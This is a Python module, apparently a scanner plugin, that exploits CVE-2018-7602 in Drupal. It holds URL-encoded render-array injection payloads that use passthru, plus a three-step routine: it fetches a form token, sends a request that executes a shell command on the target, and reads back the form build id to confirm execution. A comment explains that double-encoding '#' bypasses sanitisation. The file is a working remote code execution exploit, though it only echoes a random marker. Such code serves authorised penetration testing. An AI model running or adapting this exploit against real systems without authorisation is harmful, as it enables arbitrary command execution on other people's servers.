#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check
import re

cve_2018_7602_payloads = [
    {
        'path-1': '?q=%2Fuser%2F1%2Fcancel',
        
        'path-2': '?q=%2Fuser%2F1%2Fcancel&destination=%2Fuser%2F1%2Fcancel%3Fq%5B%2523post_render%5D%5B%5D%3Dpassthru%26q%5B%2523type%5D%3Dmarkup%26q%5B%2523markup%5D%3D',
        'data-2': 'form_id=user_cancel_confirm_form&form_token={TOKEN}&_triggering_element_name=form_id&op=Cancel+account',
        
        'path-3': '?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F',
        'data-3': 'form_build_id=',
    },
]

def cve_2018_7602_scan(self, clients):
    ''' 对URL中的#进行编码两次, 即可绕过sanitize()函数的过滤 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2018-7602',
    }

    for payload in cve_2018_7602_payloads:
        path_1 = payload['path-1']

        # todo 1 / 获取 Drupal的Token
        form_token = self.get_form_token(client, path_1, vul_info)  # * res1
        if (form_token):
            # todo 2 / 命令执行, 并获取 Build id
            random_str = random_md5(6)
            RCEcommand = 'echo ' + random_str
            
            path_2 = payload['path-2'] + RCEcommand
            data_2 = payload['data-2'].format(TOKEN=form_token)

            res2 = client.request(
                'post',
                path_2,
                data=data_2,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res2 is None:
                continue

            form_build_id = re.search(r'name="form_build_id" value="form-.{43}', res2.text, re.I|re.M|re.U|re.S)
            if (form_build_id):
                # todo 3 / 访问 Build id的路径, 验证回显
                buildId = form_build_id.group().replace('name="form_build_id" value="', '')

                path_3 = payload['path-3'] + buildId
                data_3 = payload['data-3'] + buildId

                res3 = client.request(
                    'post',
                    path_3,
                    data=data_3,
                    allow_redirects=False,
                    vul_info=vul_info
                )
                if res3 is None:
                    continue
            
                if (check.check_res(res3.text, random_str)):
                    results = {
                        'Target': res2.request.url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Request-1': res2,
                        'Request-2': res3,
                    }
                    return results
    return None
